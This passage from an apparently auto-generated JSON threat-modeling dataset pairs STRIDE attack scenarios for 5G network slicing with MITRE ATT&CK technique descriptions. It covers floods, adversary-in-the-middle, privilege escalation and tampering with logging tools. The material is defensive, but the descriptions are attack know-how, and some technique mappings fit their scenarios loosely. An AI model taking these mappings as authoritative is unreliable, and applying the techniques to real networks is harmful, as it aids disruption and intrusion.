                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A compromised NFVO exposes configuration details of network slices, leading to data leaks.",
            "Assumptions": [
                {
                    "Assumption": "NFVO has vulnerabilities not addressed",
                    "Role": "System Administrator",
                    "Condition": "Failure to patch known vulnerabilities"
                },
                {
                    "Assumption": "Lack of access control mechanisms for NFVO configurations",
                    "Role": "Access Control",
                    "Condition": "Insufficient access restrictions"
                },
                {
                    "Assumption": "Sensitive details stored without encryption",
                    "Role": "Data Security",
                    "Condition": "Weak storage practices for sensitive data"
                }
            ],
            "Potential Impact": "Unauthorized access to and disclosure of sensitive network configuration details.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "configuration leak",
                "orchestration",
                "network",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a distributed denial-of-service (DDoS) attack targeting the orchestration and management layer, disrupting network slice operations.",
            "Assumptions": [
                {
                    "Assumption": "Protections against DDoS attacks are insufficient",
                    "Role": "Network Security",
                    "Condition": "Absence or weakness of DDoS mitigation services"
                },
                {
                    "Assumption": "High reliance on external interfaces",
                    "Role": "Network Dependency",
                    "Condition": "Significant exposure through internet-facing components"
                },
                {
                    "Assumption": "Attacker possesses sufficient resources for DDoS",
                    "Role": "Attacker",
                    "Condition": "Access to botnet or large network of compromised devices"
                }
            ],
            "Potential Impact": "Disruption of network slice management and degradation of service availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "orchestration",
                "network slice",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware introduced via external interfaces targets edge and cloud computing nodes, causing system crashes and service outages.",
            "Assumptions": [
                {
                    "Assumption": "Edge and cloud nodes are not adequately protected",
                    "Role": "System Administrator",
                    "Condition": "Lack of stringent security measures for nodes"
                },
                {
                    "Assumption": "External interfaces are vulnerable to malware ingress",
                    "Role": "Network Configuration",
                    "Condition": "Weak inbound security controls"
                },
                {
                    "Assumption": "No effective malware detection and response systems",
                    "Role": "Security Monitoring",
                    "Condition": "Absence of proactive malware defenses"
                }
            ],
            "Potential Impact": "System crashes leading to partial or complete service outages.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "edge computing",
                "cloud computing",
                "service outage"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An insider performs resource exhaustion attacks by misconfiguring VNFs to consume excessive network resources.",
            "Assumptions": [
                {
                    "Assumption": "Insider has privileged access to VNF configurations",
                    "Role": "Insider",
                    "Condition": "High-level access privileges"
                },
                {
                    "Assumption": "Insufficient monitoring of resource usage",
                    "Role": "Network Monitoring",
                    "Condition": "Lack of real-time resource tracking"
                },
                {
                    "Assumption": "Network architecture does not include resource limits",
                    "Role": "Network Design",
                    "Condition": "Absence of caps on resource usage"
                }
            ],
            "Potential Impact": "Degradation of service due to resource depletion, affecting availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "virtualized environment",
                "network functions",
                "service degradation"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in a VNF to gain elevated privileges and control over network slice operations.",
            "Assumptions": [
                {
                    "Assumption": "VNF vulnerabilities remain unpatched",
                    "Role": "System Administrator",
                    "Condition": "Failure to apply security updates"
                },
                {
                    "Assumption": "No segmentation between user and control plane operations",
                    "Role": "Network Configuration",
                    "Condition": "Inadequate separation of network planes"
                },
                {
                    "Assumption": "Attacker has detailed knowledge of VNF architecture",
                    "Role": "Attacker",
                    "Condition": "Acquisition of detailed architectural information"
                }
            ],
            "Potential Impact": "Unauthorized control over network slices, leading to potential misuse and malicious configurations.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "virtualized environment",
                "network operations",
                "control plane"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider abuses their administrative privileges to escalate their access within the orchestration and management layer.",
            "Assumptions": [
                {
                    "Assumption": "Insider has administrative credentials",
                    "Role": "Insider",
                    "Condition": "Access to high-level credentials"
                },
                {
                    "Assumption": "No effective privilege access management (PAM)",
                    "Role": "Access Control",
                    "Condition": "Weak or nonexistent PAM solutions"
                },
                {
                    "Assumption": "Lack of monitoring for privileged actions",
                    "Role": "Security Monitoring",
                    "Condition": "Absence of robust logging and alerting mechanisms"
                }
            ],
            "Potential Impact": "Unauthorized access to critical aspects of network management.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider threat",
                "administrative abuse",
                "orchestration",
                "network management"
            ],
            "mitre_technique": {
                "name": "Additional Container Cluster Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
                "id": "attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64",
                "technique_id": "T1098.006"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious software or script escalates privileges in edge computing nodes, gaining control over distributed network resources.",
            "Assumptions": [
                {
                    "Assumption": "Edge computing nodes are not properly secured",
                    "Role": "System Administrator",
                    "Condition": "Weak security controls on edge nodes"
                },
                {
                    "Assumption": "Vulnerabilities in software components are unpatched",
                    "Role": "Software Maintenance",
                    "Condition": "Delay in addressing known vulnerabilities"
                },
                {
                    "Assumption": "Lack of containment for software operations",
                    "Role": "Network Configuration",
                    "Condition": "Absence of isolation and sandboxing techniques"
                }
            ],
            "Potential Impact": "Unauthorized full control over network resources at the edge, leading to potential misuse.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "software exploitation",
                "edge computing",
                "network resources",
                "control escalation"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "13",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of a network function (NF) to gain unauthorized access to network slices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the necessary network segment to spoof identity.",
                    "Role": "Attacker",
                    "Condition": "Attacker has compromised a network segment through some vulnerability."
                },
                {
                    "Assumption": "Proper authentication mechanisms are not in place or are weak.",
                    "Role": "System",
                    "Condition": "Authentication mechanisms for NFs are not robust."
                },
                {
                    "Assumption": "Monitoring and anomaly detection are not configured or are ineffective.",
                    "Role": "Network Administrators",
                    "Condition": "Ineffectiveness of security monitoring tools."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential access",
                "network function",
                "network slice"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses social engineering to spoof the identity of an administrator to access orchestration and management systems.",
            "Assumptions": [
                {
                    "Assumption": "The organization has weak social engineering defenses.",
                    "Role": "Organization",
                    "Condition": "Employees are not trained on social engineering threats."
                },
                {
                    "Assumption": "The attacker has gathered sufficient information about the admin.",
                    "Role": "Attacker",
                    "Condition": "Attacker has access to personal or professional data of the admin."
                },
                {
                    "Assumption": "The given cyber threat intelligence supports persistent targeted attacks.",
                    "Role": "Threat Actor",
                    "Condition": "APT groups like Worok are actively targeting individuals."
                }
            ],
            "Potential Impact": "Potential disruption to system or data access.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "social engineering",
                "management systems",
                "orchestration"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses compromised credentials to spoof an external interface and inject malicious traffic into the 5G core network.",
            "Assumptions": [
                {
                    "Assumption": "The attacker's malware has harvested credentials.",
                    "Role": "Attacker",
                    "Condition": "The attacker has used malware like PivNoxy to gather credentials."
                },
                {
                    "Assumption": "Multi-factor authentication is not implemented or is bypassed.",
                    "Role": "System",
                    "Condition": "Lack of robust authentication mechanisms."
                },
                {
                    "Assumption": "The connection to external networks does not have stringent monitoring.",
                    "Role": "Network Administrators",
                    "Condition": "Networking monitoring tools are inadequately configured."
                }
            ],
            "Potential Impact": "Corruption or tampering of data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "external interface",
                "malware",
                "credential theft"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies VNFs to misroute or alter the data within network slices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the hypervisor or container management.",
                    "Role": "Attacker",
                    "Condition": "Attacker has escalated privileges on the platform."
                },
                {
                    "Assumption": "There are insufficient integrity checks on VNFs.",
                    "Role": "System",
                    "Condition": "Lack of integrity monitoring tools."
                },
                {
                    "Assumption": "The environment does not enforce strict isolation of VNFs.",
                    "Role": "System",
                    "Condition": "Security policies allow inter-communication without strict controls."
                }
            ],
            "Potential Impact": "Corruption or tampering of data.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "VNF",
                "data alteration",
                "misrouting"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to orchestration and management tools to alter configurations of network slices.",
            "Assumptions": [
                {
                    "Assumption": "Default credentials are used or credentials were compromised.",
                    "Role": "Administrator",
                    "Condition": "Weak or reused credentials are being used."
                },
                {
                    "Assumption": "Access controls to orchestration tools are inadequately enforced.",
                    "Role": "System",
                    "Condition": "Lack of comprehensive role-based access controls."
                },
                {
                    "Assumption": "Audit logs are not maintained or reviewed.",
                    "Role": "Administrator",
                    "Condition": "The lack of audit trailing and regular reviews."
                }
            ],
            "Potential Impact": "Potential disruption to system or data access.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "orchestration tools",
                "configuration change",
                "management systems"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious code into VNFs running at the edge to intercept sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "The edge nodes lack sufficient monitoring and integrity checks.",
                    "Role": "Administrator",
                    "Condition": "Inadequate monitoring of edge nodes."
                },
                {
                    "Assumption": "The attacker has access to the edge computing environment.",
                    "Role": "Attacker",
                    "Condition": "Attacker has exploited a vulnerability in edge nodes."
                },
                {
                    "Assumption": "Security patching is delayed or not conducted regularly.",
                    "Role": "System",
                    "Condition": "Outdated or unpatched software in the environment."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "code injection",
                "VNF",
                "interception",
                "edge computing"
            ],
            "mitre_technique": {
                "name": "Reflective Code Loading",
                "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).\n\nReflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)\n\nReflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the \u201cinjection\u201d loads code into the processes\u2019 own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)",
                "id": "attack-pattern--4933e63b-9b77-476e-ab29-761bc5b7d15a",
                "technique_id": "T1620"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates log files to nullify evidence of an attack on the orchestration layer.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are not securely implemented.",
                    "Role": "System",
                    "Condition": "Logs do not have integrity checks and backups."
                },
                {
                    "Assumption": "The attacker has achieved a level of privilege necessary to modify logs.",
                    "Role": "Attacker",
                    "Condition": "Attacker has administrative or near-administrative privileges."
                },
                {
                    "Assumption": "There is no consistent log monitoring or alerting.",
                    "Role": "Administrator",
                    "Condition": "Lack of operational security processes."
                }
            ],
            "Potential Impact": "Corruption or tampering of data.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log manipulation",
                "orchestration layer",
                "evidence nullification"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker uses tampered credentials to make unauthorized changes in the system without leaving traceable records.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging for credential usage.",
                    "Role": "System",
                    "Condition": "Logging mechanisms do not capture detailed credential activity."
                },
                {
